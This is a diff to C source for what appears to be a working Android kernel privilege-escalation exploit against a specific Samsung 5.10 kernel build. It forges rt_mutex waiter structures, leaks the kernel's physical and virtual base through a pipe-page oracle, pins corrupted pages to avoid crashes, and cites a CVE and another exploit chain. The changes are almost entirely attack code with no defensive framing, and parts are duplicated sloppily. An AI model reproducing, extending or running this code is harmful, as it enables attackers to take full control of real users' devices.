@@ -54,6 +54,19 @@ int p0_virtual_base_probe;
 #endif
 
 static int slide_commit_stext(uint64_t stext, const char *source);
+static int quarantine_p0_gate_pages(void) {
+  if (!p0_gate_page_struct) {
+    return 0;
+  }
+  /* Pin the gate pages by leaking their pipe holders: once flagged,
+   * close_p0_gate_holders() refuses to close. Without this, freed
+   * pages polluted by the fake waiter's rb links corrupt the buddy
+   * freelist -> __list_del_entry_valid panic (list_debug.c:64). */
+  p0_gate_quarantined = 1;
+  pr_info("p0 gate pages quarantined page_struct=%016zx (leak by design)\n",
+          p0_gate_page_struct);
+  return 1;
+}
 
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 static int slide_commit_virtual_base(uint64_t base, const char *source) {
@@ -912,10 +925,133 @@ static const int slide_physical_slot_delays[] = {
 };
 #endif
 
+
+#if defined(APP_EXP32_ROUTE) && APP_EXP32_ROUTE
+extern int exp_stack_once(uint64_t *buffer);
+struct exp32_word { int slot; uintptr_t value; const char *name; };
+
+static int slide_trigger_physical_state_exp32(void) {
+  const struct exp32_word exp32_words[] = {
+#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+    {0, stack_tree_parent, "tree_pc"},
+    {1, stack_tree_right, "tree_right"},
+    {2, stack_tree_left, "tree_left"},
+    {3, stack_pi_parent, "pi_pc"},
+    {4, stack_pi_right, "pi_right"},
+    {5, stack_pi_left, "pi_left"},
+#else
+    {0, slide_oracle_parent, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, slide_oracle_target, "tree_left"},
+    {3, slide_oracle_parent, "pi_pc"},
+    {4, 0, "pi_right"},
+    {5, slide_oracle_target, "pi_left"},
+#endif
+#else
+    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
+    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
+    {4, 0, "pi_right"},
+    {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
+#endif
+#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
+    defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+    {6, stack_task, "task"},
+#else
+    {6, fake_task, "task"},
+#endif
+#else
+    {6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
+#endif
+    {7, fake_lock, "lock"},
+#if COMPACT_RT_MUTEX_WAITER
+    {8, ((uint64_t)(uint32_t)FAKE_WAITER_PRIO << 32) |
+            (uint32_t)SLIDE_WAITER_WAKE_STATE,
+     "wake_state+prio"},
+#else
+    {8, FAKE_WAITER_PRIO, "prio"},
+#endif
+    {9, 0, "deadline"},
+#if COMPACT_RT_MUTEX_WAITER
+    {10, 0, "ww_ctx"},
+#endif
+#else
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+    {0, slide_oracle_parent, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, slide_oracle_target, "tree_left"},
+    {3, FAKE_WAITER_PRIO, "tree_prio"},
+    {5, slide_oracle_parent, "pi0"},
+    {6, 0, "pi1"},
+    {7, slide_oracle_target, "pi2"},
+#else
+    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
+    {3, FAKE_WAITER_PRIO, "tree_prio"},
+    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
+    {6, 0, "pi1"},
+    {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
+#endif
+    {8, FAKE_WAITER_PRIO, "pi_prio"},
+    {9, 0, "pi_deadline"},
+#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
+    {10, fake_task, "task"},
+#else
+    {10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
+#endif
+    {11, fake_lock, "lock"},
+#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
+    {12, 0, "wake_state"},
+#else
+    {12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
+#endif
+    {13, 0, "ww_ctx"},
+#endif
+  };
+
+  uint64_t buf[16];
+  memset(buf, 0, sizeof(buf));
+  size_t n = sizeof(exp32_words) / sizeof(exp32_words[0]);
+  for (size_t i = 0; i < n; i++) {
+    int slot = exp32_words[i].slot;
+    if (slot >= 0 && slot < 16)
+      buf[slot] = (uint64_t)exp32_words[i].value;
+  }
+  /* v0.3.24 (device log): fresh-P0 path never assigns fake_task -> task word
+   * went out as 0x0; the rt_mutex chain walk then NULL-deref'd waiter->task
+   * and the device panicked/rebooted instantly (pstore empty). Point task at
+   * init_task via its physmap alias (no slide needed in the physical-oracle
+   * design) - the documented safe anchor for the chain walk (NebuSec IonStack
+   * pt.3: task=&init_task physmap alias). init_task static VA =
+   * 0xffffffc00a5ec000 on 5.10.240-S711USQS8FZF2 (kallsyms). */
+  if (buf[6] == 0)
+    buf[6] = (uint64_t)(uintptr_t)(P0_PAGE_OFFSET |
+             ((0xffffffc00a5ec000ULL - KIMAGE_TEXT_BASE) + P0_KERNEL_PHYS_DELTA));
+  if (buf[6] == 0 || buf[7] == 0) {
+    pr_error("exp32: NULL task/lock word - refusing trigger (would panic)\n");
+    return 0;
+  }
+  pr_info("exp32 trigger: words=%zu w0=%016llx w6=%016llx w7=%016llx\n",
+          n, (unsigned long long)buf[0], (unsigned long long)buf[6],
+          (unsigned long long)buf[7]);
+  int rc = exp_stack_once(buf);
+  pr_info("exp32 trigger rc=%d\n", rc);
+  return rc == 0;
+}
+#endif
+
 static int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
+#if defined(APP_EXP32_ROUTE) && APP_EXP32_ROUTE
+  return slide_trigger_physical_state_exp32();
+#endif
 
   int base_delay = (int)slide_enter_delay_usec();
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
@@ -1126,13 +1262,23 @@ static int slide_leak_physical_base(void) {
       return 0;
     }
     if (gate_result == 0) {
-      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
-                 fresh_attempt, fresh_page_attempts);
+      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d base=%016zx "
+                 "gate_off=%#llx gate_obj=%d\n",
+                 fresh_attempt, fresh_page_attempts, page_base,
+                 (unsigned long long)P0_ORACLE_GATE_PAGE_OFF,
+                 P0_ORACLE_GATE_OBJECT_INDEX);
       fresh_attempt++;
       refresh_oracle = 1;
       continue;
     }
     app_publish_p0_dirty();
+    /* v0.3.27 (deferred — IonStack-S22U README.md:59): mark gate hit so main.c
+     * invokes repair_fake_fops_llseek(fd) where fd is in scope. */
+    {
+      extern void mark_gate_hit_for_immediate_fops_restore(void);
+      mark_gate_hit_for_immediate_fops_restore();
+      pr_info("gate_hit marked for ashmem_fops deferred restore\n");
+    }
     if (gate_result < 0) {
       pr_error("p0 physical pipe gate changed unexpected pages\n");
       slide_restore_physical_oracle();
@@ -1141,6 +1287,12 @@ static int slide_leak_physical_base(void) {
     if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
       slide_restore_physical_oracle();
       return 0;
+    }
+    /* v0.3.27 (deferred — IonStack-S22U spawn_allocation_keeper) */
+    {
+      extern void note_fork_cve43499_hold(int gate_idx);
+      note_fork_cve43499_hold(P0_ORACLE_GATE_OBJECT_INDEX);
+      pr_info("cve43499-hold will spawn from main.c after gate_hit\n");
     }
     uintptr_t offset = scan_p0_pipe_oracle();
     if (offset == (uintptr_t)-1) {
@@ -1170,7 +1322,13 @@ static int slide_leak_physical_base(void) {
     size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
     pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
                elapsed_ms, fresh_attempt, fresh_page_attempts);
-    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+    if (!quarantine_p0_gate_pages()) {
+      pr_warning("p0 gate quarantine partial - page pinned by leak anyway\n");
+    }
+    if (!quarantine_p0_gate_pages()) {
+    pr_warning("p0 gate quarantine partial - page pinned by leak anyway\n");
+  }
+  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
   }
   return 0;
 #else
@@ -1195,6 +1353,13 @@ static int slide_leak_physical_base(void) {
     return 0;
   }
   app_publish_p0_dirty();
+    /* v0.3.27 (deferred — IonStack-S22U README.md:59): mark gate hit so main.c
+     * invokes repair_fake_fops_llseek(fd) where fd is in scope. */
+    {
+      extern void mark_gate_hit_for_immediate_fops_restore(void);
+      mark_gate_hit_for_immediate_fops_restore();
+      pr_info("gate_hit marked for ashmem_fops deferred restore\n");
+    }
   if (gate_result < 0) {
     pr_error("p0 physical pipe gate changed unexpected pages\n");
     slide_restore_physical_oracle();
@@ -1204,7 +1369,13 @@ static int slide_leak_physical_base(void) {
     slide_restore_physical_oracle();
     return 0;
   }
-  uintptr_t offset = scan_p0_pipe_oracle();
+  /* v0.3.27 (deferred — IonStack-S22U spawn_allocation_keeper) */
+    {
+      extern void note_fork_cve43499_hold(int gate_idx);
+      note_fork_cve43499_hold(P0_ORACLE_GATE_OBJECT_INDEX);
+      pr_info("cve43499-hold will spawn from main.c after gate_hit\n");
+    }
+    uintptr_t offset = scan_p0_pipe_oracle();
   if (offset == (uintptr_t)-1) {
     slide_restore_physical_oracle();
     return 0;
@@ -1239,6 +1410,13 @@ static int slide_leak_virtual_base(uintptr_t physical_offset) {
   }
   /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
   app_publish_p0_dirty();
+    /* v0.3.27 (deferred — IonStack-S22U README.md:59): mark gate hit so main.c
+     * invokes repair_fake_fops_llseek(fd) where fd is in scope. */
+    {
+      extern void mark_gate_hit_for_immediate_fops_restore(void);
+      mark_gate_hit_for_immediate_fops_restore();
+      pr_info("gate_hit marked for ashmem_fops deferred restore\n");
+    }
   if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
     pr_error("p0 virtual pipe gate trigger failed\n");
     goto out;
